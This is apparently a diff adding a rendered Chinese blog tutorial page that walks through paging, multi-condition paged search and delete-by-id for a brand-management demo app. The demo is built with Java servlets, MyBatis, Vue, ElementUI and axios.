+                  &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;
+                      <span class="hljs-keyword">if</span>(response.data == <span class="hljs-string">&quot;success&quot;</span>)&#123;
+                          <span class="hljs-comment">// 重新查询数据</span>
+                          _this.selectAll();
+                          <span class="hljs-comment">//显示提示框</span>
+                          _this.$message(&#123;
+                              type: <span class="hljs-string">&#x27;success&#x27;</span>,
+                              message: <span class="hljs-string">&#x27;删除成功&#x27;</span>
+                          &#125;);
+                      &#125;
+                  &#125;)
+                  &#125;).catch(<span class="hljs-function">() =&gt;</span> &#123;
+                      <span class="hljs-built_in">this</span>.$message(&#123;
+                          type: <span class="hljs-string">&#x27;info&#x27;</span>,
+                          message: <span class="hljs-string">&quot;取消删除&quot;</span>
+                      &#125;)
+              &#125;);
+          &#125;</code></pre>
+
+
+
+
+
+<h3 id="4-分页查询"><a href="#4-分页查询" class="headerlink" title="4.分页查询"></a>4.分页查询</h3><h4 id="需求分析-3"><a href="#需求分析-3" class="headerlink" title="需求分析"></a>需求分析</h4><h5 id="分页查询sql"><a href="#分页查询sql" class="headerlink" title="分页查询sql"></a>分页查询sql</h5><p>分页查询也是从数据库进行查询的，所以我们要分页对应的SQL语句应该怎么写。分页查询使用 <code>LIMIT</code> 关键字，格式为：==<code>LIMIT 开始索引 每页显示的条数</code>==。以后前端页面在发送请求携带参数时，它并不明确开始索引是什么，但是它知道查询第几页。所以 <code>开始索引</code> 需要在后端进行计算，计算的公式是 ：==开始索引 = （当前页码 -  1）*  每页显示条数==</p>
+<p>比如查询第一页的数据的 SQL 语句是：</p>
+<pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> tb_brand  <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">5</span>;</code></pre>
+
+<p>查询第二页的数据的 SQL 语句是：</p>
+<pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> tb_brand  <span class="hljs-keyword">limit</span> <span class="hljs-number">5</span>,<span class="hljs-number">5</span>;</code></pre>
+
+<p>查询第三页的数据的 SQL 语句是：</p>
+<pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> tb_brand  <span class="hljs-keyword">limit</span> <span class="hljs-number">10</span>,<span class="hljs-number">5</span>;</code></pre>
+
+<h5 id="前后端数据分析"><a href="#前后端数据分析" class="headerlink" title="前后端数据分析"></a>前后端数据分析</h5><p>分页查询功能时候比较复杂的，所以我们要先分析清楚以下两个问题：</p>
+<ul>
+<li><p><strong>前端需要传递什么参数给后端</strong></p>
+<p>根据上一步对分页查询 SQL 语句分析得出，前端需要给后端两个参数</p>
+<ul>
+<li>当前页码 ： currentPage</li>
+<li>每页显示条数：pageSize</li>
+</ul>
+</li>
+<li><p><strong>后端需要响应什么数据给前端</strong></p>
+<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210826231842293.png" alt="image-20210826231842293" style="zoom:80%;">
+
+<p>上图是分页查询页面展示的效果，从上面我们可以看出需要响应以下联股份数据</p>
+<ul>
+<li>当前页需要展示的数据。我们在后端一般会存储到 List 集合中</li>
+<li>总共记录数。在上图页面中需要展示总的记录数，所以这部分数据也需要。总的页面 elementUI 的分页组件会自动计算，我们不需要关心</li>
+</ul>
+<p>而这两部分需要封装到 PageBean 对象中，并将该对象转换为 json 格式的数据响应回给浏览器</p>
+<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210826232158234.png" alt="image-20210826232158234" style="zoom:65%;">
+
+</li>
+</ul>
+<p>通过上面的分析我们需要先在 <code>pojo</code> 包下创建 <code>PageBean</code> 类，为了做到通过会将其定义成泛型类，代码如下：</p>
+<pre><code class="hljs java"><span class="hljs-comment">//分页查询的JavaBean</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PageBean</span>&lt;<span class="hljs-title">T</span>&gt; </span>&#123;
+    <span class="hljs-comment">// 总记录数</span>
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> totalCount;
+    <span class="hljs-comment">// 当前页数据</span>
+    <span class="hljs-keyword">private</span> List&lt;T&gt; rows;
+
+
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getTotalCount</span><span class="hljs-params">()</span> </span>&#123;
+        <span class="hljs-keyword">return</span> totalCount;
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setTotalCount</span><span class="hljs-params">(<span class="hljs-keyword">int</span> totalCount)</span> </span>&#123;
+        <span class="hljs-keyword">this</span>.totalCount = totalCount;
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;T&gt; <span class="hljs-title">getRows</span><span class="hljs-params">()</span> </span>&#123;
+        <span class="hljs-keyword">return</span> rows;
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setRows</span><span class="hljs-params">(List&lt;T&gt; rows)</span> </span>&#123;
+        <span class="hljs-keyword">this</span>.rows = rows;
+    &#125;
+&#125;</code></pre>
+
+<h4 id="后端实现-3"><a href="#后端实现-3" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-3"><a href="#dao-3" class="headerlink" title="dao"></a>dao</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 分页查询</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> begin</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> size</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-meta">@Select(&quot;select * from tb_brand limit #&#123;begin&#125;, #&#123;size&#125;&quot;)</span>
+<span class="hljs-meta">@ResultMap(&quot;brandResultMap&quot;)</span>
+<span class="hljs-function">List&lt;Brand&gt; <span class="hljs-title">selectByPage</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;begin&quot;)</span> <span class="hljs-keyword">int</span> begin, <span class="hljs-meta">@Param(&quot;size&quot;)</span> <span class="hljs-keyword">int</span> size)</span></span>;
+
+<span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 查询总记录数</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-meta">@Select(&quot;select count(*) from tb_brand&quot;)</span>
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">selectTotalCount</span><span class="hljs-params">()</span></span>;</code></pre>
+
+<h5 id="service-3"><a href="#service-3" class="headerlink" title="service"></a>service</h5><pre><code class="hljs java">  <span class="hljs-comment">/**</span>
+<span class="hljs-comment">   * 分页查询</span>
+<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> currentPage</span>
+<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> pageSize</span>
+<span class="hljs-comment">   * <span class="hljs-doctag">@return</span></span>
+<span class="hljs-comment">   */</span>
+  <span class="hljs-function"><span class="hljs-keyword">public</span> PageBean&lt;Brand&gt; <span class="hljs-title">selectByPage</span><span class="hljs-params">(<span class="hljs-keyword">int</span> currentPage, <span class="hljs-keyword">int</span> pageSize)</span></span>&#123;
+      SqlSession sqlSession = sqlSessionFactory.openSession();
+      BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);
+
+      <span class="hljs-comment">// 根据公式计算起始值</span>
+      <span class="hljs-keyword">int</span> begin = (currentPage - <span class="hljs-number">1</span>) * pageSize;
+      <span class="hljs-keyword">int</span> size = pageSize;
+      <span class="hljs-comment">// 获取该页数据</span>
+      List&lt;Brand&gt; rows = mapper.selectByPage(begin, size);
+<span class="hljs-comment">// 获取总记录数</span>
+      <span class="hljs-keyword">int</span> totalCount = mapper.selectTotalCount();
+<span class="hljs-comment">// 创建PageBean对象</span>
+      PageBean&lt;Brand&gt; pageBean = <span class="hljs-keyword">new</span> PageBean&lt;&gt;();
+      pageBean.setRows(rows);
+      pageBean.setTotalCount(totalCount);
+
+      sqlSession.close();
+
+      <span class="hljs-keyword">return</span> pageBean;
+
+  &#125;</code></pre>
+
+<h5 id="servlet-3"><a href="#servlet-3" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java">  <span class="hljs-comment">/**</span>
+<span class="hljs-comment">   * 分页查询</span>
+<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> request</span>
+<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> response</span>
+<span class="hljs-comment">   * <span class="hljs-doctag">@throws</span> ServletException</span>
+<span class="hljs-comment">   * <span class="hljs-doctag">@throws</span> IOException</span>
+<span class="hljs-comment">   */</span>
+  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">selectByPage</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+      request.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);
+      <span class="hljs-comment">// 1.获取当前页码和每页展示条数 url?currentpage=1&amp;pagesize=5</span>
+      String _currentpage = request.getParameter(<span class="hljs-string">&quot;currentpage&quot;</span>);
+      String _pagesize = request.getParameter(<span class="hljs-string">&quot;pagesize&quot;</span>);
+
+      <span class="hljs-keyword">int</span> currentpage = Integer.parseInt(_currentpage);
+      <span class="hljs-keyword">int</span> pagesize = Integer.parseInt(_pagesize);
+
+      <span class="hljs-comment">// 2.转为json</span>
+      PageBean&lt;Brand&gt; pageBean = service.selectByPage(currentpage, pagesize);
+
+      String string = JSON.toJSONString(pageBean);
+<span class="hljs-comment">// 响应数据</span>
+      response.setContentType(<span class="hljs-string">&quot;text/json;charset=utf-8&quot;</span>);
+      response.getWriter().write(string);
+
+  &#125;</code></pre>
+
+<h4 id="前端实现-3"><a href="#前端实现-3" class="headerlink" title="前端实现"></a>前端实现</h4><h5 id="分页工具条"><a href="#分页工具条" class="headerlink" title="分页工具条"></a>分页工具条</h5><p>放在表单下面</p>
+<pre><code class="hljs html"><span class="hljs-comment">&lt;!--分页工具条--&gt;</span>
+&lt;el-pagination
+        @size-change=&quot;handleSizeChange&quot;   <span class="hljs-comment">&lt;!--设置每页显示条数--&gt;</span>
+        @current-change=&quot;handleCurrentChange&quot;  <span class="hljs-comment">&lt;!--修改当前页码--&gt;</span>
+        :current-page=&quot;currentPage&quot;         <span class="hljs-comment">&lt;!--绑定currentPage模型--&gt;</span>
+        :page-sizes=&quot;[5, 10, 15, 20]&quot;
+        :page-size=&quot;5&quot;
+        layout=&quot;total, sizes, prev, pager, next, jumper&quot;
+        :total=&quot;totalCount&quot;&gt;				<span class="hljs-comment">&lt;!--绑定totalCount模型--&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">el-pagination</span>&gt;</span></code></pre>
+
+<p>修改<code>handleSizeChange</code>和<code>handleCurrentChange</code></p>
+<pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">handleSizeChange</span>(<span class="hljs-params">val</span>)</span> &#123;
+    <span class="hljs-comment">// console.log(`每页 $&#123;val&#125; 条`);</span>
+    <span class="hljs-comment">// 设置每页显示条数</span>
+    <span class="hljs-built_in">this</span>.pageSize = val;
+    <span class="hljs-comment">// 重新查询</span>
+    <span class="hljs-built_in">this</span>.selectAll();
+    <span class="hljs-comment">// this.currentPage=1</span>
+&#125;,
+<span class="hljs-function"><span class="hljs-title">handleCurrentChange</span>(<span class="hljs-params">val</span>)</span> &#123;
+    <span class="hljs-built_in">this</span>.currentPage = val;
+&#125;,</code></pre>
+
+<h5 id="修改selectAll-异步请求方法"><a href="#修改selectAll-异步请求方法" class="headerlink" title="修改selectAll()异步请求方法"></a>修改selectAll()异步请求方法</h5><p>主要修改url和获取响应数据后的处理方式</p>
+<pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">selectAll</span>(<span class="hljs-params"></span>)</span>&#123;
+                <span class="hljs-comment">// var _this = this;</span>
+                <span class="hljs-comment">// axios(&#123;</span>
+                <span class="hljs-comment">//     method: &#x27;GET&#x27;,</span>
+                <span class="hljs-comment">//     url: &#x27;http://localhost:8080/brand-case/brand/selectAll&#x27;</span>
+                <span class="hljs-comment">// &#125;).then(function(response)&#123;</span>
+                <span class="hljs-comment">//     var brandlist = response.data;</span>
+                <span class="hljs-comment">//     _this.brandlist = brandlist;</span>
+                <span class="hljs-comment">// &#125;)</span>
+
+                <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;
+                axios(&#123;
+                    method: <span class="hljs-string">&#x27;GET&#x27;</span>,
+                    url: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/selectByPage?currentpage=&#x27;</span>+ _this.currentPage + <span class="hljs-string">&#x27;&amp;pagesize=&#x27;</span> + _this.pageSize
+                &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;
+                    <span class="hljs-comment">// 获取数据   &#123;rows: &#123; &#125;,totalCount:47&#125;</span>
+                    <span class="hljs-keyword">var</span> brandlist = response.data.rows;
+                    <span class="hljs-comment">// 设置表格数据</span>
+                    _this.brandlist = brandlist;
+                    <span class="hljs-comment">// 设置总记录数</span>
+                    _this.totalCount = response.data.totalCount;
+                &#125;)
+            &#125;,</code></pre>
+
+<h3 id="5-多条件分页查询"><a href="#5-多条件分页查询" class="headerlink" title="5.多条件分页查询"></a>5.多条件分页查询</h3><h4 id="需求分析-4"><a href="#需求分析-4" class="headerlink" title="需求分析"></a>需求分析</h4><ul>
+<li>用户提交数据 状态 品牌名称 企业名称， 绑定到brand模型后作为参数提交为后端</li>
+<li>三个条件的查询为and关系，并且对品牌和企业的查询需要使用模糊查询即需要like关键字</li>
+<li>查询后依然需要分页显示，因此需要返回符合条件的数据外，还要返回对应的数量</li>
+<li>可以根据分页查询修改代码</li>
+</ul>
+<h4 id="后端实现-4"><a href="#后端实现-4" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-4"><a href="#dao-4" class="headerlink" title="dao"></a>dao</h5><p>需要两个查询，<code>selelctByConditions</code>和<code>selectByConditionsCount</code></p>
+<pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 多条件查询</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> begin</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> size</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-function">List&lt;Brand&gt; <span class="hljs-title">selectByConditions</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;brand&quot;)</span> Brand brand, <span class="hljs-meta">@Param(&quot;begin&quot;)</span> <span class="hljs-keyword">int</span> begin, <span class="hljs-meta">@Param(&quot;size&quot;)</span> <span class="hljs-keyword">int</span> size)</span></span>;
+
+<span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 多条件查询的记录条数</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">selectByConditionsCount</span><span class="hljs-params">(Brand brand)</span></span>;
+</code></pre>
+
+<p>在对应的<code>BrandMapper.xml</code>中实现具体的查询</p>
+<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectByConditions&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.itheima.pojo.Brand&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;brandResultMap&quot;</span>&gt;</span>
+    select * from tb_brand
+    <span class="hljs-tag">&lt;<span class="hljs-name">where</span>&gt;</span>
+        <span class="hljs-comment">&lt;!--这里有多个参数，访问brand数据实时需要使用brand.brandName--&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;brand.brandName != null and brand.brandName != &#x27;&#x27;&quot;</span>&gt;</span>
+            and brand_name like #&#123;brand.brandName&#125;
+        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;brand.companyName != null and brand.companyName != &#x27;&#x27;&quot;</span>&gt;</span>
+            and company_name like #&#123;brand.companyName&#125;
+        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;brand.status != null&quot;</span>&gt;</span>
+            and status = #&#123;brand.status&#125;
+        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">where</span>&gt;</span>
+    limit #&#123;begin&#125;, #&#123;size&#125;
+<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectByConditionsCount&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;java.lang.Integer&quot;</span>&gt;</span>
+    select count(*) from tb_brand
+    <span class="hljs-tag">&lt;<span class="hljs-name">where</span>&gt;</span>
+         <span class="hljs-comment">&lt;!--这里为单个参数，访问brand数据实时需要使用#&#123;brandName&#125;--&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;brandName != null and brandName != &#x27;&#x27;&quot;</span>&gt;</span>
+            and brand_name like #&#123;brandName&#125;
+        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;companyName != null and companyName != &#x27;&#x27;&quot;</span>&gt;</span>
+            and company_name like #&#123;companyName&#125;
+        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;status != null&quot;</span>&gt;</span>
+            and status = #&#123;status&#125;
+        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">where</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
+
+<h5 id="service-4"><a href="#service-4" class="headerlink" title="service"></a>service</h5><p>在<code>BrandService</code>中实现多条件分页查询的业务逻辑</p>
+<pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment">   * 多条件分页查询</span>
+<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> currentPage</span>
+<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> pageSize</span>
+<span class="hljs-comment">   * <span class="hljs-doctag">@return</span></span>
+<span class="hljs-comment">   */</span>
+  <span class="hljs-function"><span class="hljs-keyword">public</span> PageBean&lt;Brand&gt; <span class="hljs-title">selectByConditionsPage</span><span class="hljs-params">(Brand brand, <span class="hljs-keyword">int</span> currentPage, <span class="hljs-keyword">int</span> pageSize)</span></span>&#123;
+      SqlSession sqlSession = sqlSessionFactory.openSession();
+      BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);
+
+      <span class="hljs-keyword">int</span> begin = (currentPage - <span class="hljs-number">1</span>) * pageSize;
+      <span class="hljs-keyword">int</span> size = pageSize;
+
+
+      <span class="hljs-comment">// 对数据进行处理加上 % 模糊查询表达式</span>
+      <span class="hljs-keyword">if</span>(brand.getBrandName() != <span class="hljs-keyword">null</span> &amp;&amp; brand.getBrandName().length() &gt; <span class="hljs-number">0</span> )&#123;
+          brand.setBrandName(<span class="hljs-string">&quot;%&quot;</span> + brand.getBrandName() + <span class="hljs-string">&quot;%&quot;</span>);
+      &#125;
+
+      <span class="hljs-keyword">if</span>(brand.getCompanyName() != <span class="hljs-keyword">null</span> &amp;&amp; brand.getCompanyName().length() &gt; <span class="hljs-number">0</span>)&#123;
+          brand.setCompanyName(<span class="hljs-string">&quot;%&quot;</span> + brand.getCompanyName() + <span class="hljs-string">&quot;%&quot;</span>);
+      &#125;
+      System.out.println(brand);
+
+      List&lt;Brand&gt; rows = mapper.selectByConditions(brand, begin, size);
+
+      <span class="hljs-keyword">int</span> totalCount = mapper.selectByConditionsCount(brand);
+
+      PageBean&lt;Brand&gt; pageBean = <span class="hljs-keyword">new</span> PageBean&lt;&gt;();
+      pageBean.setRows(rows);
+      pageBean.setTotalCount(totalCount);
+
+      sqlSession.close();
+
+      <span class="hljs-keyword">return</span> pageBean;
+
+  &#125;</code></pre>
+
+<h5 id="servlet-4"><a href="#servlet-4" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 搜索</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ServletException</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">search</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+    <span class="hljs-comment">// 1.获取当前页码和每页展示条数 url?currentpage=1&amp;pagesize=5</span>
+    String _currentpage = request.getParameter(<span class="hljs-string">&quot;currentpage&quot;</span>);
+    String _pagesize = request.getParameter(<span class="hljs-string">&quot;pagesize&quot;</span>);
+    <span class="hljs-keyword">int</span> currentpage = Integer.parseInt(_currentpage);
+    <span class="hljs-keyword">int</span> pagesize = Integer.parseInt(_pagesize);
+
+    <span class="hljs-comment">// 2.获取json字符串</span>
+    BufferedReader reader = request.getReader();
+    String line = reader.readLine();
+    System.out.println(line);
+    <span class="hljs-comment">// 3.将json字符串转为brand对象</span>
+    Brand brand = JSON.parseObject(line, Brand.class);
+
+    System.out.println(brand);
+    <span class="hljs-comment">// 4.调用service方法 获取pageBean对象</span>
+    PageBean&lt;Brand&gt; pageBean = service.selectByConditionsPage(brand, currentpage, pagesize);
+
+
+    <span class="hljs-comment">// 5.将PageBean转为Json字符串</span>
+    String string = JSON.toJSONString(pageBean);
+    <span class="hljs-comment">// 6.发送响应数据</span>
+    response.setContentType(<span class="hljs-string">&quot;text/json;charset=utf-8&quot;</span>);
+    response.getWriter().write(string);
+&#125;</code></pre>
+
+<h4 id="前端实现-4"><a href="#前端实现-4" class="headerlink" title="前端实现"></a>前端实现</h4><h5 id="获取查询条件"><a href="#获取查询条件" class="headerlink" title="获取查询条件"></a>获取查询条件</h5><p>查询表单绑定的模型为<code>searchBrand</code></p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-form</span> <span class="hljs-attr">:inline</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">:model</span>=<span class="hljs-string">&quot;searchBrand&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo-form-inline&quot;</span>&gt;</span></code></pre>
+
+<p><code>searchBrand</code>数据如下</p>
+<pre><code class="hljs js"><span class="hljs-comment">// 搜索数据</span>
+             searchBrand:&#123;
+                 status: <span class="hljs-string">&#x27;&#x27;</span>,
+                 brandName: <span class="hljs-string">&#x27;&#x27;</span>,
+                 companyName: <span class="hljs-string">&#x27;&#x27;</span>,
+                 id:<span class="hljs-string">&quot;&quot;</span>,
+                 ordered:<span class="hljs-string">&quot;&quot;</span>,
+                 description:<span class="hljs-string">&quot;&quot;</span>
+             &#125;,</code></pre>
+
+<p>当用户输入条件后，数据自动绑定到<code>searchBrand</code>模型上，向后台提交数据时，提交<code>searchBrand</code>即可</p>
+<h5 id="查询的异步请求"><a href="#查询的异步请求" class="headerlink" title="查询的异步请求"></a>查询的异步请求</h5><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">search</span>(<span class="hljs-params"></span>)</span>&#123;
+           <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;
+
+           axios(&#123;
+               method: <span class="hljs-string">&#x27;POST&#x27;</span>,
+               url: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/search?currentpage=&#x27;</span>+ _this.currentPage + <span class="hljs-string">&#x27;&amp;pagesize=&#x27;</span> + _this.pageSize,
+               data: <span class="hljs-built_in">this</span>.searchBrand
+           &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;
+                   <span class="hljs-comment">// 获取数据   &#123;rows: &#123; &#125; &#125;</span>
+                   <span class="hljs-comment">// 设置表格数据</span>
+                   _this.brandlist = response.data.rows;
+                   <span class="hljs-comment">// 设置总记录数</span>
+                   _this.totalCount = response.data.totalCount;
+                   _this.currentPage = <span class="hljs-number">1</span>;
+           &#125;)
+       &#125;</code></pre>
+
+
+
+<h3 id="6-删除单条数据"><a href="#6-删除单条数据" class="headerlink" title="6.删除单条数据"></a>6.删除单条数据</h3><h4 id="需求分析-5"><a href="#需求分析-5" class="headerlink" title="需求分析"></a>需求分析</h4><ul>
+<li>删除单条数据时需要携带该数据的id，使用get请求既可</li>
+<li>获取id，可以使用<code>scope.row.id</code></li>
+</ul>
+<h4 id="后端实现-5"><a href="#后端实现-5" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-5"><a href="#dao-5" class="headerlink" title="dao"></a>dao</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 删除指定商品</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> id</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-meta">@Delete(&quot;delete from tb_brand where id = #&#123;id&#125;&quot;)</span>
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">deleteById</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;id&quot;)</span> <span class="hljs-keyword">int</span> id)</span></span>;</code></pre>
+
+<h5 id="service-5"><a href="#service-5" class="headerlink" title="service"></a>service</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 删除指定数据</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> id</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deleteById</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span></span>&#123;
+    SqlSession sqlSession = sqlSessionFactory.openSession();
+    BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);
+
+    mapper.deleteById(id);
+    sqlSession.commit();
+    sqlSession.close();
+&#125;</code></pre>
+
+<h5 id="servlet-5"><a href="#servlet-5" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 删除指定数据</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ServletException</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deleteById</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+
+    String _id = request.getParameter(<span class="hljs-string">&quot;id&quot;</span>);
+    <span class="hljs-keyword">int</span> id = Integer.parseInt(_id);
+    service.deleteById(id);
+    response.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);
+
+&#125;</code></pre>
+
+<h4 id="前端实现-5"><a href="#前端实现-5" class="headerlink" title="前端实现"></a>前端实现</h4><h5 id="获取id"><a href="#获取id" class="headerlink" title="获取id"></a>获取id</h5><p><a href="https://blog.csdn.net/tg928600774/article/details/81945140">参考</a></p>
+<p>在修改和删除按钮位置添加<code>slot-scope=&quot;scope&quot;</code></p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-row</span> <span class="hljs-attr">slot-scope</span>=<span class="hljs-string">&quot;scope&quot;</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;update(scope.row)&quot;</span> &gt;</span>修改<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;danger&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;deleteById(scope.row.id)&quot;</span> &gt;</span>删除<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">el-row</span>&gt;</span></code></pre>
+
